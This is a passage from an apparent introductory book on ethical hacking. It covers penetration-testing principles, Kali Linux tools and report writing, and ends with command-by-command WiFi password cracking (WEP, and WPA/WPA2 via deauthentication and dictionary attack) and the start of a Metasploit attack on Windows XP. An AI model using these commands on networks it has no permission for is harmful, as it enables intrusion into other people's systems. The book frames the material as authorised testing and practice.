or system	to	detect	and	fix	the	target’s	weaknesses.	Businesses	are	willing	to	shell	out	some cash	in	order	to	protect	their	systems	from	black	hat	hackers.	Because	of	this,	penetration testing	serves	as	a	profitable	and	exciting	activity	for	ethical	hackers.  This	 chapter	 will	 teach	 you	 the	 basics	 of	 penetration	 testing.	 It	 will	 explain	 the	 core principles	of	“pen	testing”	and	give	you	a	list	of	tools	that	you	must	use.	In	addition,	it will	provide	you	with	a	step-by-step	plan	for	conducting	a	penetration	test.  	   Penetration	Testing	–	The	Basics  A	penetration	tester	tries	to	breach	the	defenses	of	his	target	without	prior	access	to	any username,	password,	or	other	related	information.	The	tester	will	use	his	skills,	tools,	and knowledge	to	obtain	data	related	to	his	target	and	prove	the	existence	of	vulnerabilities. When	attacking	a	local	network,	a	penetration	test	would	be	considered	successful	if	the tester	successfully	collects	confidential	information.  As	you	can	see,	penetration	testing	has	a	lot	of	similarities	with	malicious	hacking.	There are	two	major	differences	between	these	two:	permission	and	the	hacker’s	intentions.	A tester	 has	 the	 permission	 to	 attack	 his	 target.	 And	 his	 main	 goal	 is	 to	 help	 his	 clients improve	 their	 digital	 security.	 In	 contrast,	 malicious	 hackers	 don’t	 ask	 for	 the	 target’s permission.	They	simply	perform	attacks	in	order	to	steal	information,	destroy	networks, or	attain	other	horrible	goals.  Often,	a	tester	needs	to	attack	his	target	as	a	basic	user.	He	must	enhance	his	access	rights and or	collect	information	that	other	basic	users	cannot	reach.  Some	clients	want	the	tester	to	focus	on	a	single	vulnerability.	In	most	cases,	however,	a tester	must	record	each	weakness	that	he	will	discover.	The	repeatability	of	the	hacking process	is	important.	Your	clients	won’t	believe	your	findings	if	you	can’t	repeat	what	you did.  	   The	Rules	of	Penetration	Testing  Remember	that	there’s	a	fine	line	between	penetration	testing	and	malicious	hacking.	To make	sure	that	you	will	not	“go	over”	to	the	dark	side,	follow	these	simple	rules:  	 Focus	on	Ethics You	 should	 work	 as	 a	 professional.	 Consider	 your	 morals	 and	 personal	 principles.	 It doesn’t	 matter	 whether	 you’re	 attacking	 your	 own	 computer	 or	 testing	 a	 company’s network:	all	of	your	activities	must	be	aligned	with	your	goals.	Do	not	aim	for	any	hidden agenda.  As	 an	 ethical	 hacker,	 trustworthiness	 is	 your	 main	 asset.	 Never	 use	 client-related information	 for	 personal	 purposes.	 If	 you’ll	 ignore	 this	 rule,	 you	 might	 find	 yourself behind	bars.  	 Respect	Privacy Every	piece	of	information	that	you’ll	collect	during	a	penetration	test	is	important.	Never use	that	data	to	gather	corporate	details	or	spy	on	other	people.	If	you	have	to	share	any information,	talk	to	the	authorized	personnel.  	 Don’t	Crash	Any	System Inexperienced	hackers	usually	crash	their	targets	accidentally.	This	tendency	results	from poor	planning	and	preparation.	Most	beginners	don’t	even	read	the	instructions	that	come with	the	tools	they	are	using.  Your	system	can	experience	DoS	 denial-of-service 	during	a	penetration	test.	This	often happens	when	the	hacker	runs	multiple	tests	simultaneously.	It	would	be	best	if	you’ll	wait for	a	test	to	finish	before	running	another	one.	Don’t	assume	that	your	target	can	survive your	attacks	without	any	form	of	damage.  Important	Note:	Your	goal	is	to	help	your	clients	in	improving	their	digital	security.	The last	thing	you	want	to	do	is	bring	down	their	entire	network	while	you’re	conducting	a test.	This	event	will	ruin	your	reputation	as	a	hacker.   	   Penetration	Testing	–	The	Process  Here’s	a	detailed	description	of	the	process	involved	in	penetration	testing:  	 Secure	Permission Don’t	do	anything	on	your	target	until	you	have	written	permission	from	your	client.	This document	can	protect	you	from	nasty	lawsuits	or	similar	problems.	Verbal	authorization	is not	sufficient	when	performing	hacking	attacks.	Remember:	countries	are	implementing strict	rules	and	penalties	regarding	activities	related	to	hacking.  	 Formulate	a	Plan A	 plan	 can	 boost	 your	 chances	 of	 succeeding.	 Hacking	 a	 system	 can	 be	 extremely complicated,	especially	when	you	are	dealing	with	modern	or	unfamiliar	systems.	The	last thing	you	want	to	do	is	launch	an	attack	with	unorganized	thoughts	and	tricks.  When	creating	a	plan,	you	should:  Specify	your	target s Determine	the	risks Determine	the	schedule	and	deadline	of	your	penetration	test Specify	the	methods	that	you’ll	use Identify	the	information	and	access	that	you	will	have	at	the	start	of	your	test Specify	the	“deliverables”	 the	output	that	you’ll	submit	to	your	client   Focus	 on	 targets	 that	 are	 vulnerable	 or	 important.	 Once	 you	 have	 tested	 the “heavyweights”,	the	remaining	part	of	the	test	will	be	quick	and	easy.  Here	are	some	targets	that	you	can	attack:  Mobile	devices	 e.g.	smartphones  Operating	Systems Firewalls Email	servers Network	Infrastructure Workstations Computer	programs	 e.g.	email	clients    Routers  Choose	Your	Tools  Important	 Note:	 You	 should	 be	 extremely	 careful	 when	 choosing	 a	 hacking	 method. Consider	the	effects	of	that	method	and	how	your	target	will	likely	respond.	For	example, password	crackers	can	lock	out	legitimate	users	from	the	system.	This	type	of	accident	can be	disastrous	during	business	hours.  Kali	 Linux	 contains	 various	 hacking	 tools.	 If	 you	 are	 using	 that	 operating	 system,	 you won’t	need	to	download	other	programs	for	your	penetration	tests.	However,	Kali’s	large collection	of	tools	can	be	daunting	and or	confusing.	You	might	have	problems	identifying the	tools	you	need	for	each	task	that	you	must	accomplish.  Here	are	some	of	the	most	popular	tools	in	Kali	Linux:  Nmap	–	You’ll	find	this	program	in	the	toolkit	of	almost	all	hackers.	It	is	one	of most	 powerful	 tools	 that	 you	 can	 use	 when	 it	 comes	 to	 security	 auditing	 and network	discovery.	If	you	are	a	network	administrator,	you	may	also	use	Nmap	in tracking	 host	 uptime,	 controlling	 the	 schedule	 of	 your	 service	 upgrades,	 and checking	network	inventory.  This	 tool	 is	 perfect	 for	 scanning	 huge	 computer	 networks.	 However,	 it	 is	 also	 effective when	used	against	small	targets.	Because	Nmap	is	popular,	you	will	find	lots	of	available resources	in	mastering	this	program.  Ghost	Phisher	–	This	tool	is	an	Ethernet	and	wireless	attack	program.	It	can	turn your	computer	into	an	access	point	 or	a	hotspot 	and	hijack	other	machines.	It	can also	 work	 with	 the	 Metasploit	 framework	  you	 will	 learn	 more	 about	 Metasploit later . Maltego	Teeth	–	With	this	program,	you	will	see	the	threats	that	are	present	in	your target’s	environment.	Maltego	Teeth	can	show	the	seriousness	and	complications	of different	failure	points.	You	will	also	discover	the	trust-based	relationships	inside the	infrastructure	of	your	target.  This	tool	uses	the	internet	to	collect	information	about	your	target	system	and	its	users. Hackers	use	Maltego	Teeth	to	determine	the	relationships	between:  Domains Companies Phrases   Files People Netblocks Websites IP	addresses Affiliations  Wireshark	 –	 Many	 hackers	 consider	 this	 tool	 as	 the	 best	 analyzer	 for	 network protocols.	It	allows	you	to	monitor	all	activities	in	a	network.	The	major	features	of Wireshark	are:  It	can	capture	data	packets	and	perform	offline	analysis It	can	perform	VoIP	 i.e.	Voice	over	Internet	Protocol 	analysis It	has	a	user-friendly	GUI	 graphical	user	interface  It	can	export	data	to	different	file	types	 e.g.	CSV,	plaintext,	XML,	etc.  It	can	run	on	different	operating	systems	 e.g.	OS	X,	Linux,	NetBSD,	etc.   Exploitdb	 –	 The	 term	 “exploitdb”	 is	 the	 abbreviation	 for	 “Exploit	 Database”. Basically,	 exploitdb	 is	 a	 collection	 of	 exploits	  i.e.	 a	 program	 that	 “exploits”	 a target’s	vulnerability 	and	the	software	they	can	run	on.	The	main	purpose	of	this database	is	to	provide	a	comprehensive	and	up-to-date	collection	of	exploits	that computer	researchers	and	penetration	testers	can	use.  You	 need	 to	 find	 vulnerability	 before	 attacking	 a	 target.	 And	 you	 need	 an	 exploit	 that works	on	the	vulnerability	you	found.	You’ll	spend	days	 or	even	weeks 	just	searching for	potential	weaknesses	and	creating	effective	exploits.	With	exploitdb,	your	tasks	will become	 quick	 and	 easy.	 You	 just	 have	 to	 run	 a	 search	 for	 the	 operating	 system	 and or program	you	want	to	attack,	and	exploitdb	will	give	you	all	the	information	you	need.  Aircrack-ng	–	This	is	a	collection	of	tools	that	you	can	use	to	test	WiFi	networks. With	Aircrack-ng,	you	can	check	the	following	aspects	of	wireless	networks:  Testing	–	You	can	use	it	to	test	your	drivers	and	WiFi	cards. Attacking	 –	 Use	 Aircrack-ng	 to	 perform	 packet	 injections	 against	 your targets. Cracking	–	This	tool	allows	you	to	collect	data	packets	and	crack	passwords. Monitoring	–	You	may	capture	packets	of	data	and	save	them	as	a	text	file. Then,	you	may	use	the	resulting	files	with	other	hacking	tools.  Johnny	 –	 This	 tool	 is	 an	 open-source	 GUI	 for	 “John	 the	 Ripper”,	 a	 well-known password	cracker.	It	is	possible	to	use	“JTR”	as	is.	However,	Johnny	can	automate the	tasks	involved	in	cracking	passwords.	In	addition,	this	GUI	adds	more	functions   to	the	JTR	program.  	 Implement	Your	Plan Penetration	testing	requires	persistence.	You	need	to	be	patient	while	attacking	your	target. Sometimes,	 cracking	 a	 single	 password	 can	 take	 several	 days.	 Carefulness	 is	 also important.	Protect	the	information	you’ll	gather	as	much	as	you	can.	If	other	people	will get	their	hands	on	your	findings,	your	target	will	be	in	extreme	danger.  You	don’t	have	to	search	for	potential	hackers	before	running	your	test.	If	you	can	keep your	activities	private	and	secure,	you	are	good	to	go.	This	principle	is	crucial	during	the transmission	 of	 your	 findings	 to	 your	 clients.	 If	 you	 have	 to	 send	 the	 information	 via email,	you	must	encrypt	it	and	set	a	password	for	it.  You	can	divide	the	execution	of	an	attack	into	four	phases:  1.	 Collect	information	regarding	your	target.	Google	can	help	you	with	this	task. 2.	 Trim	down	your	options.	If	you	conducted	a	successful	research,	you	will	have	a	lot of	 potential	 points	 of	 entry.	 You	 have	 limited	 time	 so	 it	 would	 be	 impossible	 to check	all	of	those	entry	points.	Evaluate	each	system	and	choose	the	ones	that	seem vulnerable.  3.	 Use	your	tools	to	reduce	your	options	further.	You	can	use	scanners	and	data	packet  collectors	to	find	the	best	targets	for	your	attack.  4.	 Conduct	your	attack	and	record	your	findings.  	 Evaluate	the	Results Analyze	 the	 data	 you	 collected.	 That	 data	 will	 help	 you	 in	 detecting	 network vulnerabilities	and	proving	their	existence.	Knowledge	plays	an	important	role	in	this	task. You	 will	 surely	 face	 some	 difficulties	 during	 your	 first	 few	 tries.	 However,	 things	 will become	easy	once	you	have	gained	the	requisite	knowledge	and	experience.  Important	Note:	Create	a	written	report	regarding	your	findings.	Share	the	data	with	your clients	to	prove	that	hiring	you	is	one	of	the	best	decisions	they	made.  	   The	Different	Forms	of	Penetration	Tests  The	form	of	penetration	test	that	you’ll	conduct	depends	on	the	needs	of	your	client.	In this	part	of	the	book,	you’ll	learn	about	the	different	kinds	of	“pen	tests”.  	 Black	Box	Tests In	a	black	box	test,	you	don’t	have	any	information	regarding	your	target.	Your	first	task	is to	research	about	your	client’s	network.	Your	client	will	define	the	results	they	need,	but they	won’t	give	you	other	pieces	of	data.  The	Advantages  Black	box	tests	offer	the	following	advantages:  The	 tester	 will	 start	 from	 scratch.	 Thus,	 he	 will	 act	 like	 a	 malicious	 hacker	 who wants	to	access	a	network. The	tester	will	have	higher	chances	of	detecting	conflicts	in	the	network. The	tester	doesn’t	need	to	be	an	expert	programmer.	Unlike	other	types	of	pen	tests, black	box	tests	don’t	rely	on	ready-made	scripts.  The	Disadvantages  The	disadvantages	of	black	box	tests	are:  It	can	be	time-consuming. It	is	extremely	complex.	The	tester	needs	to	spend	time	and	effort	in	designing	and launching	an	attack. 	  White	Box	Tests These	 tests	 are	 detailed	 and	 comprehensive,	 since	 the	 hacker	 has	 access	 to	 all	 the information	 related	 to	 his	 target.	 For	 example,	 the	 hacker	 can	 use	 the	 IP	 addresses	 and source	codes	of	a	network	as	basis	for	his	attack.  This	form	of	test	relies	heavily	on	codes	and	programming	skills.  The	Advantages  The	main	advantages	of	white	box	testing	are:  It	makes	sure	that	each	module	path	is	working	properly.   It	 makes	 sure	 that	 each	 logical	 decision	 is	 verified	 and	 comes	 with	 the	 right Boolean	value. It	allows	the	hacker	to	detect	errors	in	scripts. It	helps	the	hacker	in	identifying	design	flaws	that	result	from	conflicts	between	the target’s	logical	flow	and	actual	implementation.  	 Gray	Box	Tests Here,	the	hacker	has	access	to	some	information	regarding	his	target.	You	may	think	of	a gray	box	test	as	a	combination	of	black	box	and	white	box	tests.  The	Advantages  The	 hacker	 can	 perform	 the	 test	 even	 without	 using	 the	 network’s	 source	 code. Thus,	the	penetration	test	is	objective	and	non-intrusive. There	will	be	minimal	connection	between	the	tester	and	the	developer. The	client	doesn’t	need	to	supply	every	piece	of	information	to	the	tester.	Sharing private	 or	 sensitive	 information	 with	 an	 outsider	 is	 extremely	 risky,	 especially	 if that	third-party	is	skilled	in	attacking	networks.  	   Different	Facets	of	a	Penetration	Test  You	can	divide	a	penetration	test	into	three	facets,	namely:  	 Network	Penetration This	facet	focuses	on	the	physical	attributes	of	your	target.	The	main	goal	of	this	facet	is	to identify	 vulnerabilities,	 determine	 risks,	 and	 ensure	 the	 security	 of	 a	 network.	 As	 the hacker,	 you	 should	 search	 for	 flaws	 in	 the	 design,	 operation,	 or	 implementation	 of	 the network	 you’re	 dealing	 with.	 You	 will	 probably	 hack	 modems,	 computers,	 and	 access devices	in	this	part	of	the	attack.  	 Application	Penetration In	 this	 facet,	 you	 will	 concentrate	 on	 the	 target’s	 logical	 structure.	 It	 simulates	 hacking attacks	 to	 verify	 the	 effectiveness	 of	 the	 network’s	 existing	 defenses.	 Application penetration	usually	requires	hackers	to	test	the	firewall	and or	monitoring	mechanisms	of their	target.  	 System	Workflows	or	Responses This	facet	focuses	on	how	the	organization’s	workflows	and	responses	will	change	during an	attack.	It	also	involves	the	relationship	of	end-users	with	their	computers.	During	this, the	 penetration	 tester	 will	 know	 whether	 the	 members	 of	 the	 network	 can	 prevent malicious	attacks.  	   Manual	and	Automated	Tests  Penetration	testers	divide	tests	into	two	categories:	manual	and	automated.	Manual	tests rely	on	the	skills	of	a	white	hat	hacker.	The	tester	has	complete	control	over	the	process.	If he	makes	a	mistake,	the	entire	penetration	test	can	prove	to	be	useless.	Automated	tests, on	the	other	hand,	don’t	need	human	intervention.	Once	the	test	runs,	the	computer	will take	care	of	everything:	from	selecting	targets	to	recording	the	results.  In	this	part	of	the	book,	you’ll	learn	important	information	regarding	these	types	of	tests. You	need	to	master	this	concept	if	you’re	serious	about	hacking.	With	this	knowledge,	you can	easily	determine	the	type	of	test	that	must	be	used	in	any	situation.  	 Manual	Penetration	Tests You	 will	 run	 manual	 tests	 most	 of	 the	 time.	 Here,	 you	 will	 use	 your	 tools,	 skills,	 and knowledge	to	find	the	weaknesses	of	a	network.  Manual	tests	involve	the	following	steps:  Research	–	This	step	has	a	huge	influence	over	the	entire	process.	If	you	have	a	lot of	information	about	your	target,	attacking	it	will	be	easy.	You	can	conduct	research using	the	internet.	For	example,	you	may	look	for	specific	information	manually	or run	your	hacking	tools.  Kali	Linux	has	a	wide	of	range	of	tools	that	you	can	use	in	this	“reconnaissance”	phase. With	 Kali’s	 built-in	 programs,	 you	 can	 easily	 collect	 data	 about	 your	 targets	  e.g. hardware,	software,	database,	plugins,	etc. .  Assessment	 of	 Weaknesses	 –	 Analyze	 the	 information	 you	 collected	 and	 identify the	 potential	 weaknesses	 of	 the	 target.	 Your	 knowledge	 and	 experience	 will	 help you	 in	 this	 task.	 Obviously,	 you	 need	 to	 work	 on	 the	 obvious	 weaknesses	 first. That’s	because	these	weaknesses	attract	black	hat	hackers. Exploitation	–	Now	that	you	know	the	specific	weaknesses	of	your	target,	you	must perform	 an	 attack.	 You	 will	 “exploit”	 a	 weakness	 by	 attacking	 it	 with	 a	 hacking tool. Preparation	and	Submission	of	Output	–	Record	all	the	information	you	gathered during	the	test.	Arrange	the	data	so	that	your	clients	can	easily	determine	the	next steps.	Make	sure	that	your	report	is	clearly	explained.	Don’t	use	jargon.   White	hat	hackers	divide	manual	penetration	tests	into	the	following	categories:  test	 covers	 an	 entire	 network.	 A Comprehensive	 Tests	 –	 This	 kind	 of	 comprehensive	test	aims	to	determine	the	connections	between	the	parts	of	a	target. However,	comprehensive	tests	are	time-consuming	and	situational. Focused	Tests	–	Tests	that	belong	to	this	category	concentrate	on	a	specific	risk	or vulnerability.	 Here,	 the	 hacker	 will	 use	 his	 skills	 in	 pinpointing	 and	 exploiting certain	vulnerabilities	in	a	network. 	  Automated	Penetration	Tests Automated	tests	are	easy,	fast,	reliable	and	efficient.	You	can	get	detailed	reports	just	by pressing	 a	 single	 button.	 The	 program	 will	 take	 care	 of	 everything	 on	 your	 behalf.	 In general,	 the	 programs	 used	 in	 this	 test	 are	 newbie-friendly.	 They	 don’t	 require	 special skills	or	knowledge.	If	you	can	read	and	use	a	mouse,	you’re	good	to	go.  The	 most	 popular	 programs	 for	 automated	 tests	 are	 Metasploit,	 Nessus,	 and	 OpenVAs. Metasploit	is	a	hacking	framework	that	can	launch	attacks	against	any	operating	system. Hackers	consider	Metasploit	as	their	primary	weapon.  Infrastructure	Tests  A	computer	system	or	network	usually	consists	of	multiple	devices.	Most	of	these	devices play	an	important	role	in	keeping	the	system network	stable	and	effective.	If	one	of	these devices	malfunctions,	the	entire	system	or	network	might	suffer.	That	is	the	reason	why penetration	testers	must	attack	the	infrastructure	of	their	targets.  	 The	Basics	of	Infrastructure	Tests An	infrastructure	test	involves	internal	computer	networks,	internet	connection,	external devices,	and	virtualization	technology.	Let’s	discuss	these	in	detail:  Internal	Infrastructure	Tests	-	Hackers	can	take	advantage	of	flaws	in	the	internal security	of	a	network.	By	testing	the	internal	structure	of	a	target,	you	will	be	able to	identify	and	solve	existing	weaknesses.	You	will	also	prevent	the	members	of	the organization	from	attacking	the	structure	from	the	inside. External	 Infrastructure	 Tests	 –	 These	 tests	 simulate	 black	 hat	 attacks.	 Because malicious	 hackers	 will	 attack	 a	 network	 from	 outside,	 it’s	 important	 to	 check whether	the	external	defense	mechanisms	of	that	network	are	strong.   Wireless	 Network	 Tests	 –	 WiFi	 technology	 allows	 you	 to	 connect	 devices indirectly.	 Here,	 data	 packets	 will	 just	 travel	 from	 one	 device	 to	 another.	 This technology	offers	convenience.	However,	convenience	creates	vulnerability.  Hackers	 may	 	 	 	 	 	 	 	 	 	 	 	 	 	 scan	 for	 data	 packets	 that	 are	 being	 sent	 in	 a	 network.	 Once Aircrack-ng,	 Wireshark,	 or	 similar	 tools	 obtain	 these	 data	 packets,	 the	 network	 will	 be prone	to	hacking	attacks.  A	 wireless	 network	 test	 allows	 the	 white	 hat	 hacker	 to	 improve	 the	 target’s	 defenses against	wireless	attacks.	The	tester	may	also	use	his	findings	to	create	guidelines	for	the network’s	end-users.  Virtualization	 and	 Cloud	 Infrastructure	 Tests	 –	 Storing	 company-related information	in	third-party	servers	is	extremely	risky.	The	hackers	may	capture	the data	as	it	goes	to	the	“cloud”	server.	They	may	also	attack	the	cloud	server	itself and	access	all	the	information	stored	there.	Because	the	incident	happened	outside the	network,	tracking	the	culprits	can	be	extremely	difficult.  	   How	to	Write	a	Report  Your	 efforts	 will	 go	 to	 waste	 if	 you	 won’t	 record	 your	 results.	 To	 become	 a	 successful white	hat	hacker,	you	should	know	how	to	write	good	reports.	In	this	part	of	the	book, you’ll	 discover	 important	 tips,	 tricks,	 and	 techniques	 in	 writing	 reports	 for	 penetration tests.  	 Main	Elements	of	a	Report  Goals	 –	 Describe	 the	 purpose	 of	 your	 test.	 You	 may	 include	 the	 advantages	 of penetration	testing	in	this	part	of	the	report. Time	–	You	should	include	the	timestamp	of	the	activities	you	will	perform.	This will	give	an	accurate	description	of	the	network’s	status.	If	a	problem	occurs	later on,	the	hacker	can	use	the	timestamps	of	his	activities	to	determine	the	cause	of	the issue. Audience	 –	 The	 report	 should	 have	 a	 specific	 audience.	 For	 example,	 you	 may address	your	report	to	the	company’s	technical	team,	IT	manager,	or	CEO. Classification	–	You	should	classify	the	document	since	it	contains	sensitive	data. However,	the	mode	of	classification	depends	on	your	client. Distribution	–	Your	report	contains	confidential	information.	If	a	black	hat	hacker gets	access	to	that	document,	the	network	you	were	meant	to	protect	will	go	down. Thus,	your	report	should	indicate	the	total	number	of	copies	you	made	as	well	as the	people	to	whom	you	sent	them.	Each	report	must	have	an	ID	number	and	the name	of	its	recipient.  	 Data	Gathering Penetration	tests	involve	long	and	complex	processes.	As	a	result,	you	need	to	describe every	piece	of	information	that	you’ll	collect	during	the	attack.	Describing	your	hacking techniques	 isn’t	 enough.	 You	 should	 also	 explain	 your	 assessments,	 the	 results	 of	 your scans,	as	well	as	the	output	of	your	hacking	tools.  	 Creating	Your	First	Draft Write	the	initial	draft	of	your	report	after	collecting	all	the	information	you	need.	Make   sure	 that	 this	 draft	 is	 full	 of	 details.	 Focus	 on	 the	 processes,	 experiences,	 and	 activities related	to	your	test.  	 Proofreading Typographical	and or	grammatical	errors	can	ruin	your	report.	Thus,	you	need	to	review your	work	and	make	sure	that	it	is	error-free.	Once	you’re	satisfied	with	your	output,	ask your	colleagues	to	check	it.	This	approach	will	help	you	produce	excellent	reports.  	 Outline	of	a	Test	Report  1.	 Executive	Summary  1.	 Scope	and	Limitations	of	the	Project 2.	 Objectives 3.	 Assumptions 4.	 Timeline 5.

Appendix   	  The	Legal	Aspect	of	Penetration	Tests  As	a	hacker,	you	will	deal	with	confidential	data	concerning	a	business	or	organization. Accidents	might	happen,	and	the	information	may	leak	to	other	people.	That	means	you need	to	be	prepared	for	legal	issues	that	may	arise	in	your	hacking	projects.  This	part	of	the	book	will	discuss	the	legal	aspect	of	hacking.	Read	this	material	carefully: it	can	help	you	avoid	lawsuits	and	similar	problems.  	 Legal	Problems Here	are	some	of	the	legal	problems	that	you	may	face:  Leakage	of	confidential	information Financial	losses	caused	by	faulty	tests  You	 can	 prevent	 the	 problems	 given	 above	 by	 securing	 an	 “intent	 statement”.	 This statement	proves	the	agreement	between	the	client	and	the	tester.	This	document	describes all	of	the	details	related	to	the	penetration	test.	You’ll	use	an	intent	statement	to	avoid	legal issues	in	the	future.	Thus,	both	parties	should	sign	the	document	before	the	test	starts.    Chapter	6:	Specific	Hacking	Techniques  This	chapter	will	teach	you	several	hacking	techniques.	These	techniques	are	basic,	yet extremely	effective.	They	work	in	different	situations:	you	may	use	them	during	practice or	while	testing	a	network.	In	addition,	they	rely	on	tools	that	are	present	in	Kali	Linux.	If you	are	using	Kali	as	your	OS	for	your	hacking	activities,	you	won’t	have	to	download any	additional	tool.  Important	 Note:	 Kali	 Linux	 is	 an	 OS	 that	 is	 especially	 designed	 for	 hackers	 and penetration	testers.	It’s	not	meant	to	replace	Windows	or	OS	X.	You	can	install	Kali	on	a flash	drive	so	you	won’t	have	to	uninstall	the	OS	of	your	computer.	Whenever	you	need	to hack	something,	just	plug	in	your	flash	drive	on	a	laptop desktop	and	you’re	good	to	go. All	of	your	hacking	tools	are	inside	your	pocket,	literally.  	   How	to	Hack	WiFi	Networks	that	Use	WEP	Encryption  More	 and	 more	 people	 are	 using	 wireless	 networks.	 Thus,	 every	 hacker	 needs	 to	 know how	to	attack	this	kind	of	target.	In	this	section,	you’ll	use	Kali	Linux	to	hack	a	WEP- encrypted	WiFi	password.  Important	Note:	You’re	still	practicing	so	don’t	use	it	on	other	people’s	network.	It	would be	best	if	you’ll	create	your	own	wireless	network.	There	are	a	lot	of	videos	on	YouTube regarding	that	task.	Watching	videos	and	installing	a	network	is	better	than	getting	arrested for	attacking	your	neighbor’s	WiFi.	Never	forget:	unauthorized	hacking	is	illegal.  To	hack	a	WEP-encrypted	password,	you	should	do	the	following:  1.	 Determine	the	ID	of	your	computer’s	wireless	adapter.  Each	 computer	 contains	 multiple	 network	 adapters.	 Your	 first	 task	 is	 to	 look	 for	 the wireless	adapter	and	view	its	name.	This	step	is	quick	and	painless:	you	just	have	to	open a	terminal,	type	“ifconfig”,	and	hit	the	Enter	key.	Your	screen	will	show	you	something like	this:  Most	computers	will	give	you	three	adapters:	eth,	lo,	and	wlan.	For	this	task,	you	should focus	on	the	“wlan”	adapter.	The	image	above	shows	that	the	name	of	the	wireless	adapter is	“wlan1”.  2.	 Run	the	Airmon-ng	program.  “Airmon-ng”	is	a	part	of	the	“Aircrack-ng”	suite.	It	allows	you	to	generate	a	monitoring interface	 for	 the	 attack.	 To	 activate	 this	 program,	 just	 type	 “airmon-ng	 start	 wlan_ID”.   Replace	“wlan_ID”	with	the	name	of	your	adapter	 e.g.	airmon-ng	start	wlan1” .  Your	screen	will	show	you	this:  3.	 Capture	data	packets	from	your	target	network.  Now,	you	should	collect	some	data	packets	available	in	your	area.	You	need	to	use	a	tool called	“airodump-ng”	for	this.	Basically,	“airodump-ng”	 which	is	another	member	of	the aircrack-ng	suite 	looks	for	data	packets	and	shows	you	all	of	the	existing	WiFi	networks near	you.  The	command	that	you	should	type	is:  airodump-ng	wlan0mon.  	  The	terminal	will	show	you	a	list	of	available	networks.	Here’s	an	example:   4.	 Save	the	data	packets	as	a	“cap”	file.  You	 can	 accomplish	 this	 task	 by	 issuing	 the	 “—write”	 command	 to	 airodump-ng.	 The code	that	you	should	use	is:  airodump-ng	wlan0mon	—write	FileName  	  	  Just	replace	 “FileName”	with	 the	filename	 that	 you	want	 to	use.	 Let’s	assume	 that	 you want	to	use	“practice”	as	the	file.	The	code	becomes:  airodump-ng	wlan0mon	—write	sample  The	information	will	be	saved	in	a	file	named	“sample.cap”.  5.	 Run	a	password	cracker.  Launch	another	terminal	and	run	“aircrack-ng”	to	identify	the	password	of	the	network. Just	type	the	name	of	the	program	and	specify	the	cap	file	you	created	earlier.	For	this example,	the	command	is:  aircrack-ng	sample  It’s	 possible	 that	 your	 file	 contains	 more	 than	 one	 WiFi	 network.	 If	 that	 is	 the	 case, aircrack-ng	will	ask	you	to	specify	the	one	you	want	to	attack.	Follow	the	instructions	on the	screen	and	wait	for	the	program	to	complete	the	process.	The	resulting	code	will	have colons	 “:” 	in	it.	You	can	get	the	password	of	the	network	by	removing	the	colons.	For example,	if	you	got	EX:AM:PL:ES,	the	password	of	the	network	is	EXAMPLES.   	   How	to	Hack	WiFi	Networks	that	Use	WPA WPA-2  Encryption  WEP-encrypted	passwords	are	easy	to	hack.	WPA WPA-2	passwords,	however,	are	time- consuming	 and	 resource-intensive.	 This	 is	 the	 reason	 why	 most	 WiFi	 networks	 use WPA WPA-2	 encryption.	 Cracking	 this	 form	 of	 encryption	 is	 difficult,	 but	 certainly doable.	Here	are	the	steps	you	need	to	take:  1.	 Launch	a	terminal	and	launch	airmon-ng.  Type:  airmon-ng	start	wlan_ID  Replace	“wlan_ID”	with	the	name	of	your	adapter.  2.	 Capture	data	packets	using	the	airodump-ng	program.  You	can	complete	this	task	by	typing  airodump-ng	wlan0mon  3.	 Save	the	packets	inside	a	cap	file. 4.	 The	command	that	must	type	is:  airodump-ng	wlan0mon	—write	NameofFile  	  	  	  	  ng”.  5.	 Take	note	of	the	BSSID	of	your	target	and	initiate	the	program	called	“aireplay-  You’ll	 find	 the	 BSSID	 of	 a	 network	 in	 the	 airodump-ng	 screen.	 After	 getting	 that information,	type:  aireplay-ng	—deauth	0	–a	BSSID	wlan0mon  Replace	“BSSID”	with	the	BSSID	of	your	target.  6.	 Use	the	following	syntax:   aircrack-ng	NameofFile.cap	–w	dictionary.txt  	  7.	 Replace	 “NameofFile.cap”	 with	 the	 cap	 file	 you	 generated.	 Then,	 replace “dictionary.txt”	 with	 the	 dictionary	 file	 that	 you	 want	 to	 use	 for	 the	 process.	 A dictionary	file	is	a	text	file	that	contains	possible	passwords.	Kali	Linux	has	several dictionary	files	that	you	can	use.  8.	 Wait	 for	 the	 program	 to	 complete	 the	 process.	 If	 your	 chosen	 dictionary	 file contains	the	encrypted	password,	aircrack-ng	will	give	you	a	positive	result.	If	the password	 is	 not	 in	 the	 text	 file,	 however,	 the	 program	 will	 ask	 you	 to	 specify another	dictionary.  	   How	to	Hack	Windows	XP  Windows	XP	is	an	old	operating	system.	In	fact,	Microsoft	stopped	issuing	updates	for	this OS.	However,	many	people	are	still	using	XP	on	their	computers.	Because	this	OS	won’t get	any	future	updates,	its	existing	vulnerabilities	will	be	forever	available	to	hackers	and penetration	testers.  This	section	will	teach	you	how	to	attack	Windows	XP	using	the	Metasploit	framework. The	author	assumes	that	you	are	using	Kali	Linux	and	that	you	have	a	virtual	machine	that runs	Windows	XP.	Virtual	machines	allow	you	to	run	multiple	operating	systems	 in	this case,	Kali	Linux	and	Windows	XP 	on	a	single	computer.	There	are	a	lot	of	instructional materials	regarding	virtual	machines	on	YouTube.  Important	Note:	Make	sure	that	you	are	using	a	virtual	machine.	Practicing	this	hacking technique	on	a	real	Windows	XP	computer	can	lead	to	serious	problems.	If	something	bad happens	on	a	virtual	machine,	you	can	just	restart	it	by	pressing	some	buttons.	Busting	an actual	XP	computer,	on	the	other	hand,	may	lead	to	repair	costs.  	 The	Process You	must	break	into	a	network	before	hacking	the	computers	linked	to	it.	However,	this lesson	 doesn’t	 require	 any	 network	 attack.	 That’s	 because	 the	 XP	 operating	 system	 is installed	in	your	Kali	computer.	Thus,	the	XP	virtual	machine	belongs	to	your	computer network.  To	hack	a	Windows	XP	computer,	you	should:  1.	 Start	the	Metasploit	Framework	in	your	Kali	Linux	OS.  Launch	a	terminal	and	type:  service	postgresql	start  	  And  This	 command	 activates	 PostgreSQL	 on	 your	 computer.	 PostgreSQL	 serves	 as	 the database	of	Metasploit,	so	you	should	run	it	first	before	triggering	the	program	itself.	Now, type:  service	metasploit	start   msfconsole  If	you	did	everything	right,	your	terminal	should	look	like	this:  2.	 Use	the	“port	scan”	feature	of	Metasploit	to	find	targets.  The	Metasploit	framework	comes	with	various	auxiliary	tools.	Port	Scan	is	one	of	the	best tools	present	in	this	framework.	This	tool	allows	you	to	scan	all	of	the	ports	of	a	machine. It	can	provide	you	with	detailed	information	about	the	open	ports	of	your	target.	As	you know,	a	port	serves	as	